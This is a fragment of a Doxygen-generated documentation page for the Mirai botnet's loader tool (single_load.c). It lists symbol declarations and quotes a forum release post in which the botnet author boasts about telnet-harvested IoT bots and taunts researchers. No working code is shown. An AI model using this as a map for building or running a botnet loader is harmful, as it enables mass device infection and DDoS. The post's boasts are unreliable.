<div class="ttc" id="ForumPost_8txt_html_ab292715cb198b54d1912ed6209d567dc"><div class="ttname"><a href="ForumPost_8txt.html#ab292715cb198b54d1912ed6209d567dc">free</a></div><div class="ttdeci">try harder skiddo Your skeleton tool sucks it thought the attack decoder was sinden but it does not even use a text based protocol CNC and bot communicate over binary protocol you say some others kill based on cwd It shows how out of the loop you are with real malware Go back to skidland slaps for you Why are you writing reverse engineer tools You cannot even correctly reverse in the first place Please learn some skills first before trying to impress others Your arrogance in declaring how you beat me with your dumb kung fu statement made me laugh so hard while eating my SO had to pat me on the back Just as I forever be free</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00030">ForumPost.txt:30</a></div></div>
<div class="ttc" id="single__load_8c_html_ac7b080a6c9a6f86019eb3acd7c6ac075"><div class="ttname"><a href="single__load_8c.html#ac7b080a6c9a6f86019eb3acd7c6ac075">port</a></div><div class="ttdeci">volatile unsigned short port</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00049">single_load.c:49</a></div></div>
<div class="ttc" id="single__load_8c_html_a132912f867b9c79296731cc953db0e0d"><div class="ttname"><a href="single__load_8c.html#a132912f867b9c79296731cc953db0e0d">remote_hangup</a></div><div class="ttdeci">volatile unsigned long remote_hangup</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00048">single_load.c:48</a></div></div>
<div class="ttc" id="single__load_8c_html_a3d9244c38db4e45c616af5557f5aa8a6"><div class="ttname"><a href="single__load_8c.html#a3d9244c38db4e45c616af5557f5aa8a6">stateTable</a></div><div class="ttdeci">struct stateSlot_t stateTable[1024 *100]</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00091">single_load.c:91</a></div></div>
<div class="ttc" id="single__load_8c_html_ade3fd107ea730977ea13ae06f11a466a"><div class="ttname"><a href="single__load_8c.html#ade3fd107ea730977ea13ae06f11a466a">found_srvs</a></div><div class="ttdeci">volatile unsigned long found_srvs</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00043">single_load.c:43</a></div></div>
<div class="ttc" id="single__load_8c_html_a9ae97c4e98713a8e03d2dc33d07248d5"><div class="ttname"><a href="single__load_8c.html#a9ae97c4e98713a8e03d2dc33d07248d5">timed_out</a></div><div class="ttdeci">volatile unsigned long timed_out</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00045">single_load.c:45</a></div></div>
<div class="ttc" id="single__load_8c_html_a25b6b0d5a233ac0249fe798020e9d86a"><div class="ttname"><a href="single__load_8c.html#a25b6b0d5a233ac0249fe798020e9d86a">getConnectedSockets</a></div><div class="ttdeci">int getConnectedSockets()</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00326">single_load.c:326</a></div></div>
<div class="ttc" id="single__load_8c_html_aa3595475b02d25686ffadbcf19472db2"><div class="ttname"><a href="single__load_8c.html#aa3595475b02d25686ffadbcf19472db2">handle_failed_connect</a></div><div class="ttdeci">void handle_failed_connect(int fd)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00250">single_load.c:250</a></div></div>
<div class="ttc" id="single__load_8c_html_a3ade46bb9591205f4fa0b1daf0641f84"><div class="ttname"><a href="single__load_8c.html#a3ade46bb9591205f4fa0b1daf0641f84">run_arg</a></div><div class="ttdeci">char * run_arg</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00052">single_load.c:52</a></div></div>
<div class="ttc" id="structstateSlot__t_html"><div class="ttname"><a href="structstateSlot__t.html">stateSlot_t</a></div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00056">single_load.c:56</a></div></div>
<div class="ttc" id="single__load_8c_html_a66822609acc48ad7a36a4546881fe0ae"><div class="ttname"><a href="single__load_8c.html#a66822609acc48ad7a36a4546881fe0ae">chomp</a></div><div class="ttdeci">void chomp(char *s)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00754">single_load.c:754</a></div></div>
<div class="ttc" id="wget_8c_html_a68dc4fd7189d34e2052e25ada13f89e0"><div class="ttname"><a href="wget_8c.html#a68dc4fd7189d34e2052e25ada13f89e0">read</a></div><div class="ttdeci">#define read</div><div class="ttdef"><b>Definition:</b> <a href="wget_8c_source.html#l00049">wget.c:49</a></div></div>
<div class="ttc" id="single__load_8c_html_a5c3a83864bf5991d09aa5c2abb911bf0"><div class="ttname"><a href="single__load_8c.html#a5c3a83864bf5991d09aa5c2abb911bf0">TOKEN</a></div><div class="ttdeci">#define TOKEN</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00026">single_load.c:26</a></div></div>
<div class="ttc" id="single__load_8c_html_a73904daa97a0de0ca1ae5f82b172cf90"><div class="ttname"><a href="single__load_8c.html#a73904daa97a0de0ca1ae5f82b172cf90">loader</a></div><div class="ttdeci">void * loader(void *threadCount)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00760">single_load.c:760</a></div></div>
<div class="ttc" id="single__load_8c_html_a0ddf1224851353fc92bfbff6f499fa97"><div class="ttname"><a href="single__load_8c.html#a0ddf1224851353fc92bfbff6f499fa97">main</a></div><div class="ttdeci">int main(int argc, char *argv[])</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00929">single_load.c:929</a></div></div>
<div class="ttc" id="structstateSlot__t_html_aef0c0771a735aa97966f56ca13c5318a"><div class="ttname"><a href="structstateSlot__t.html#aef0c0771a735aa97966f56ca13c5318a">stateSlot_t::complete</a></div><div class="ttdeci">int complete</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00071">single_load.c:71</a></div></div>
<div class="ttc" id="single__load_8c_html_aba6226c3e69f3896f4c1749d4b21c157"><div class="ttname"><a href="single__load_8c.html#aba6226c3e69f3896f4c1749d4b21c157">BYTES_PER_LINE</a></div><div class="ttdeci">#define BYTES_PER_LINE</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00030">single_load.c:30</a></div></div>
<div class="ttc" id="single__load_8c_html_aa2b7fda41691fd8bf8cdfb06ca803451"><div class="ttname"><a href="single__load_8c.html#aa2b7fda41691fd8bf8cdfb06ca803451">TOKEN_VERIFY</a></div><div class="ttdeci">#define TOKEN_VERIFY</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00027">single_load.c:27</a></div></div>
<div class="ttc" id="single__load_8c_html_a1ce52af2a54d5a57b7c857001720ba65"><div class="ttname"><a href="single__load_8c.html#a1ce52af2a54d5a57b7c857001720ba65">log_send</a></div><div class="ttdeci">int log_send(int sock, void *buf, int len, int flags)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00194">single_load.c:194</a></div></div>
<div class="ttc" id="structstateSlot__t_html_ad68a66e6fda6e114a1075e5e7ae1e829"><div class="ttname"><a href="structstateSlot__t.html#ad68a66e6fda6e114a1075e5e7ae1e829">stateSlot_t::is_open</a></div><div class="ttdeci">unsigned char is_open</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00063">single_load.c:63</a></div></div>
<div class="ttc" id="single__load_8c_html_a9ae6cc04b42a7e7c08e115f2a0eea899"><div class="ttname"><a href="single__load_8c.html#a9ae6cc04b42a7e7c08e115f2a0eea899">diff</a></div><div class="ttdeci">static int diff(int val)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00095">single_load.c:95</a></div></div>
<div class="ttc" id="single__load_8c_html_ab5a5480e7ca5603df2e3fb59300b966a"><div class="ttname"><a href="single__load_8c.html#ab5a5480e7ca5603df2e3fb59300b966a">closeAndCleanup</a></div><div class="ttdeci">void closeAndCleanup(int fd)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00285">single_load.c:285</a></div></div>
<div class="ttc" id="single__load_8c_html_a96eec5f5fffb2e552b7241dca3c2dca8"><div class="ttname"><a href="single__load_8c.html#a96eec5f5fffb2e552b7241dca3c2dca8">bin_path</a></div><div class="ttdeci">static char * bin_path</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00040">single_load.c:40</a></div></div>
<div class="ttc" id="structstateSlot__t_html_afc9e0447a5d34feee8f8fdb9e84acf40"><div class="ttname"><a href="structstateSlot__t.html#afc9e0447a5d34feee8f8fdb9e84acf40">stateSlot_t::path</a></div><div class="ttdeci">char path[5][32]</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00080">single_load.c:80</a></div></div>
<div class="ttc" id="structstateSlot__t_html_a04169334dba5afd2745542626499cd4d"><div class="ttname"><a href="structstateSlot__t.html#a04169334dba5afd2745542626499cd4d">stateSlot_t::got_prompt</a></div><div class="ttdeci">unsigned char got_prompt</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00065">single_load.c:65</a></div></div>
<div class="ttc" id="structstateSlot__t_html_a4719fed38fd60dbb6248ff2dbd980e27"><div class="ttname"><a href="structstateSlot__t.html#a4719fed38fd60dbb6248ff2dbd980e27">stateSlot_t::fd</a></div><div class="ttdeci">int fd</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00074">single_load.c:74</a></div></div>
<div class="ttc" id="structstateSlot__t_html_af2928a0b0dd2a40d06b5f2294593274f"><div class="ttname"><a href="structstateSlot__t.html#af2928a0b0dd2a40d06b5f2294593274f">stateSlot_t::special</a></div><div class="ttdeci">unsigned char special</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00064">single_load.c:64</a></div></div>
<div class="ttc" id="single__load_8c_html_a012fc0d9c1397d1166fad67f36216256"><div class="ttname"><a href="single__load_8c.html#a012fc0d9c1397d1166fad67f36216256">MAX_SLICE_LENGTH</a></div><div class="ttdeci">#define MAX_SLICE_LENGTH</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00032">single_load.c:32</a></div></div>
<div class="ttc" id="single__load_8c_html_a8c1a8db0710bb3f25f643a0fca68fc60"><div class="ttname"><a href="single__load_8c.html#a8c1a8db0710bb3f25f643a0fca68fc60">ceilf</a></div><div class="ttdeci">float ceilf(float x)</div></div>
<div class="ttc" id="single__load_8c_html_a1291ce6483fd6521a8ea472b6f1384aa"><div class="ttname"><a href="single__load_8c.html#a1291ce6483fd6521a8ea472b6f1384aa">maxFDSaw</a></div><div class="ttdeci">volatile unsigned int maxFDSaw</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00050">single_load.c:50</a></div></div>
<div class="ttc" id="structstateSlot__t_html_a0a912afe1412b83a1a360e2e366cb49f"><div class="ttname"><a href="structstateSlot__t.html#a0a912afe1412b83a1a360e2e366cb49f">stateSlot_t::success</a></div><div class="ttdeci">unsigned char success</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00062">single_load.c:62</a></div></div>
<div class="ttc" id="single__load_8c_html_a99169136d6396257b7564d360ddb1b3e"><div class="ttname"><a href="single__load_8c.html#a99169136d6396257b7564d360ddb1b3e">bin_server</a></div><div class="ttdeci">static char * bin_server</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00038">single_load.c:38</a></div></div>
<div class="ttc" id="single__load_8c_html_af12c2939d7340f74f1b3aa3f5cd49ca7"><div class="ttname"><a href="single__load_8c.html#af12c2939d7340f74f1b3aa3f5cd49ca7">handle_remote_closed</a></div><div class="ttdeci">void handle_remote_closed(int fd)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00240">single_load.c:240</a></div></div>
<div class="ttc" id="single__load_8c_html_ac891ccd192d22a97ec092f7d888237ab"><div class="ttname"><a href="single__load_8c.html#ac891ccd192d22a97ec092f7d888237ab">infd</a></div><div class="ttdeci">FILE * infd</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00051">single_load.c:51</a></div></div>
<div class="ttc" id="structstateSlot__t_html_a721d0ad3dabe6a8ab733633dac0b6d8c"><div class="ttname"><a href="structstateSlot__t.html#a721d0ad3dabe6a8ab733633dac0b6d8c">stateSlot_t::echoInd</a></div><div class="ttdeci">uint16_t echoInd</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00069">single_load.c:69</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_a3eaa76d3cfe977972a9bf87dbc12c50f"><div class="ttname"><a href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a></div><div class="ttdeci">World s Largest Echo CNC source code release Anna When I first go in DDoS I wasn t planning on staying in it long I made my there s lots of eyes looking at IOT so it s time to GTFO I know every skid and their it s their wet dream to have something besides qbot So I have an amazing release for you With I usually pull max bots from telnet alone after the Kreb ISPs been slowly shutting down and cleaning up their act max pull is about and dropping I am your and I will treat you real my hf chan And to everyone that thought they were doing anything by hitting my I had good this bot uses domain for CNC It takes seconds for all bots to lol shoutout to this blog post by malwaremustdie thought you were good but you really just completely and totally failed in reversing this binary We still have better kung fu than you kiddos don t make me laugh you made so many mistakes and even confused some different binaries with my LOL Let me give you some slaps back port is not for back connect</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00001">ForumPost.txt:1</a></div></div>
<div class="ttc" id="single__load_8c_html_afdc29b4b6b64963d88e1b69fd47a73d3"><div class="ttname"><a href="single__load_8c.html#afdc29b4b6b64963d88e1b69fd47a73d3">updateAccessTime</a></div><div class="ttdeci">void updateAccessTime(int fd)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00318">single_load.c:318</a></div></div>
<div class="ttc" id="single__load_8c_html_afa54e717c52681c4ee6722efed32e67f"><div class="ttname"><a href="single__load_8c.html#afa54e717c52681c4ee6722efed32e67f">failed_connect</a></div><div class="ttdeci">volatile unsigned long failed_connect</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00047">single_load.c:47</a></div></div>
<div class="ttc" id="structstateSlot__t_html_ad56d8a19fb1b26615b1a1da138685b90"><div class="ttname"><a href="structstateSlot__t.html#ad56d8a19fb1b26615b1a1da138685b90">stateSlot_t::slotUsed</a></div><div class="ttdeci">int slotUsed</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00058">single_load.c:58</a></div></div>
<div class="ttc" id="single__load_8c_html_a57abc471d40878085782a301e7543803"><div class="ttname"><a href="single__load_8c.html#a57abc471d40878085782a301e7543803">binary</a></div><div class="ttdeci">struct @4 binary</div></div>
<div class="ttc" id="structbinary_html"><div class="ttname"><a href="structbinary.html">binary</a></div><div class="ttdef"><b>Definition:</b> <a href="binary_8h_source.html#l00007">binary.h:7</a></div></div>
<div class="ttc" id="enc_8c_html_aa880e16f83b9fba77f7b9cb8ab81a6fe"><div class="ttname"><a href="enc_8c.html#aa880e16f83b9fba77f7b9cb8ab81a6fe">x</a></div><div class="ttdeci">void * x(void *, int)</div><div class="ttdef"><b>Definition:</b> <a href="enc_8c_source.html#l00080">enc.c:80</a></div></div>
<div class="ttc" id="single__load_8c_html_a40ea84f37bdd97a9380f0b0689cb9f6f"><div class="ttname"><a href="single__load_8c.html#a40ea84f37bdd97a9380f0b0689cb9f6f">bind_ip</a></div><div class="ttdeci">static char * bind_ip</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00034">single_load.c:34</a></div></div>
<div class="ttc" id="structstateSlot__t_html_a88d3c42ff51a10be8140af96e823e79d"><div class="ttname"><a href="structstateSlot__t.html#a88d3c42ff51a10be8140af96e823e79d">stateSlot_t::updatedAt</a></div><div class="ttdeci">int updatedAt</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00075">single_load.c:75</a></div></div>
<div class="ttc" id="single__load_8c_html_a7b5dd1f48db83f53473fd67f032334fe"><div class="ttname"><a href="single__load_8c.html#a7b5dd1f48db83f53473fd67f032334fe">slices</a></div><div class="ttdeci">unsigned char ** slices</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00088">single_load.c:88</a></div></div>
<div class="ttc" id="single__load_8c_html_a46a5c759285caddc5c5a39aee3b2c48d"><div class="ttname"><a href="single__load_8c.html#a46a5c759285caddc5c5a39aee3b2c48d">memmem</a></div><div class="ttdeci">void * memmem(const void *l, size_t l_len, const void *s, size_t s_len)</div><div class="ttdef"><b>Definition:</b> <a href="single__load_8c_source.html#l00218">single_load.c:218</a></div></div>
</div><!-- fragment --></div><!-- contents -->
</div><!-- doc-content -->
<!-- start footer part -->
<div id="nav-path" class="navpath"><!-- id is needed for treeview function! -->
  <ul>
    <li class="navelem"><a class="el" href="dir_526aa88726c618d995900bd3fb6ff493.html">mirai</a></li><li class="navelem"><a class="el" href="dir_c54249edde3ee6500f3b8dcaccfc308c.html">tools</a></li><li class="navelem"><a class="el" href="single__load_8c.html">single_load.c</a></li>
    <li class="footer">Generated by
    <a href="http://www.doxygen.org/index.html">
    <img class="footer" src="doxygen.png" alt="doxygen"/></a> 1.8.11 </li>
  </ul>
</div>
</body>
</html>
